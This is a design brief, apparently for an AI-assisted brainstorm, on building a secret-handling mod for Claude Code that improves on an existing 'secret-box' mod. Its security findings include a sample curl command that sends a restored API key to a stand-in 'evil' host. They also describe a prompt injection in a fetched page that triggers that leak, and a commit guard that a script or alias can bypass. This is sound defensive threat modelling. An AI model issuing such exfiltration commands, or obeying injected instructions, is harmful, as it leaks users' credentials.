# Brief: design a new secret-handling mod

Shared context for the brainstorm between Claude (Claude Code) and Pi. Do not write code. This is a design discussion.

## Goal

Design a new Claude Code mod for this repository (`/Users/dave/Development/personal/mods`). It takes the idea of the third-party mod `secret-box` and improves it. We do not copy its code and we do not send changes upstream. Think about UI, UX, usefulness, and above all security.

## Read first

1. `docs/mods/` in this repository: all files (`overview.md`, `create-a-mod.md`, `reference.md`, `build/*`, `test-and-troubleshoot/*`). They describe the mods API, events, UI surfaces, limits, and tests.
2. `AGENTS.md` in this repository: conventions (the store holds numbers only, logic in pure functions, thin hooks module, tests first, `claude plugin test`, `claude plugin validate --strict .`, Biome).
3. The upstream code, read-only: `/var/folders/p7/09kltt0n5dg5bcgfd_v092h80000gn/T/tmp.vdV4OxiniR/repo/plugins/secret-box/` (`README.md`, `hooks/register.jsx`, `hooks/redact.ts`, `hooks/detect.ts`). MIT license, commit `4ee4b4c`, version 0.5.5.
4. The user's priorities (global rules): security, reliability, accessibility, maintainability, then performance. Treat every project as regulated (HIPAA, PCI-DSS, GDPR).

## What secret-box does

- A `request_secret` tool. Claude calls it, a pane opens with a masked input, the user pastes a key. The mod writes `NAME=value` to `.env` in the project root, makes sure `.gitignore` covers it, and returns a placeholder like `[REDACTED-SECRET-3f9a1c2e]` to Claude.
- An in-memory vault maps placeholder to value for the session.
- A redactor (`redact.ts` + `detect.ts`, about 1,900 lines, about 70 vendor key shapes plus entropy rules) scans prompts, tool results, CLAUDE.md, `@` attachments, and subagent prompts, and replaces secrets with placeholders.
- Before `Bash`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit` run, placeholders become real values. `git commit` / `gh` commands get no restore. A value with shell characters is never put into Bash.
- Placeholders that come back in tool output become `LITERAL` placeholders, so a placeholder read from a file does not turn into the key again.
- Regex guards refuse `git add .env`, a `git commit` that would include `.env`, and `@.env`.
- Every hook fails closed through `.catch`.
- The pane waits for the user by running `sleep 0.3` repeatedly (hook time is capped at 10 s; time inside a mods API call does not count).

## Findings from Claude's analysis

- F1. Restore into Bash is an exfiltration path: `curl https://evil/?k=[REDACTED-SECRET-…]` sends the real key. A prompt injection in a fetched page can trigger it. Only git/gh are excluded.
- F2. `Write`/`Edit` put the real key on disk in any file, including tracked source files that later get committed. The commit guard only looks at `.env` names. Most probable accidental leak.
- F3. `quote()` wraps a value with `$` in double quotes without escaping; `source .env`, Docker Compose, dotenv-expand then expand it. A wrong value is saved silently.
- F4. Busy-wait with about 2,000 `sleep` processes over 10 minutes; depends on an undocumented timing rule.
- F5. The masked input does not track mid-field edits; a wrong value is saved without warning. A paste can show for one frame.
- F6. The commit guard is a regex; a script or alias goes around it.
- F7. `saveToDotenv` matches only `NAME=`, so `export NAME=` or `NAME =` lines get duplicated.
- F8. The redactor is duplicated across two upstream mods; installing both gives two vaults.

## Decisions so far

- Build our own mod from the idea. Not a fork, not an upstream PR.
- Mod work in this repo follows `AGENTS.md`. Coding later goes to a worker; this phase is design only.

## Open questions to brainstorm (not exhaustive)

- Threat model: accidental leak vs. prompt-injected model vs. malicious model. What do we promise?
- Where secrets live: `.env`, the OS keychain, a secrets manager, a per-session file? How does code use them without the value entering the transcript?
- Can we avoid placeholder restore into Bash entirely (for example, inject secrets as env vars of the process, or run commands through a wrapper), and keep usefulness?
- Write/Edit policy for real values.
- Detection: reuse the idea of vendor shapes + entropy, scope it, test it.
- UI/UX: the input pane, narrow terminals, a vault/inventory view, audit of where a secret was used, revocation/rotation helpers, accessibility.
- What the store may hold (numbers only).
- Name of the mod.
